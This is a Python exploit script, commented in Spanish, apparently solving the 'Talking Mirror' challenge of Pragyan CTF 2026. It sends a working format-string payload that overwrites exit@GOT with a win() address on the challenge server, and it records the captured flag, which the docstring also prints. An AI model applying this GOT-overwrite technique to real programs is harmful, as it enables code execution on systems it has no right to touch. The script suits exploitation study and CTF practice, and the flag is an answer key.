#!/usr/bin/env python3
"""
Talking Mirror - Exploit Final
Pragyan CTF 2026

Técnica: Format String Write via RBP chain indirection
- Usa argumentos SECUENCIALES (no posicionales) para escritura doble
- Modifica offset 20 (main_bp) para que offset 22 apunte a exit@GOT
- Escribe win() en exit@GOT

Flag: p_ctf{7hETAlk!n6M!RR0RSpOkeONE7OOmANyT!m3S}
"""
from pwn import *

context.log_level = 'info'

HOST = 'talking-mirror.ctf.prgy.in'
PORT = 1337

EXIT_GOT = 0x400a50  # 4,196,944 decimal
WIN_ADDR = 0x401216  # 4,630 en los 16 bits bajos

def exploit():
    """
    Payload: %4196926c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%n%1990c%hn

    Secuencia:
    1. %4196926c + 18×%c = 4,196,944 chars = EXIT_GOT
    2. %n (arg 20) → escribe 4,196,944 a *(main_bp)
    3. %1990c → 1990 chars adicionales
    4. %hn (arg 22) → escribe 0x1216 a *(exit@GOT)
    """

    log.info("Talking Mirror - Format String RBP Chain")
    log.info(f"Target: {HOST}:{PORT}")

    io = remote(HOST, PORT, ssl=True)

    # Construir payload
    PAD1 = EXIT_GOT - 18  # 4,196,926
    PAD2 = (WIN_ADDR & 0xFFFF) - (EXIT_GOT % 65536)  # 1990

    fmt = f"%{PAD1}c" + "%c" * 18 + "%n" + f"%{PAD2}c" + "%hn"
    payload = fmt.encode()

    log.info(f"Payload size: {len(payload)} bytes")
    log.info(f"PAD1: {PAD1} (para llegar a {EXIT_GOT})")
    log.info(f"PAD2: {PAD2} (para llegar a {WIN_ADDR & 0xFFFF})")

    # Recibir prompt
    io.recvuntil(b'repeat it.\n')

    # Enviar payload
    log.info("Enviando payload...")
    io.sendline(payload)

    # Recibir output (~4.2MB de espacios + flag)
    log.info("Esperando output (~4.2MB, puede tomar ~120s)...")

    try:
        data = io.recvall(timeout=150)
        text = data.decode(errors='ignore')

        log.info(f"Output recibido: {len(data)} bytes")

        # Buscar flag
        if 'p_ctf' in text:
            idx = text.index('p_ctf')
            flag = text[idx:idx+100].split('\n')[0].strip()

            log.success(f"Flag: {flag}")

            # Guardar en flags.txt
            with open('/root/ctf/flags.txt', 'a') as f:
                f.write(f"Talking Mirror (verified): {flag}\n")

            return flag
        else:
            log.error("Flag no encontrada en output")
            # Mostrar últimos 500 chars
            log.info(f"Últimos chars: ...{text[-500:]}")

    except Exception as e:
        log.error(f"Error recibiendo output: {e}")

    finally:
        io.close()

if __name__ == "__main__":
    exploit()
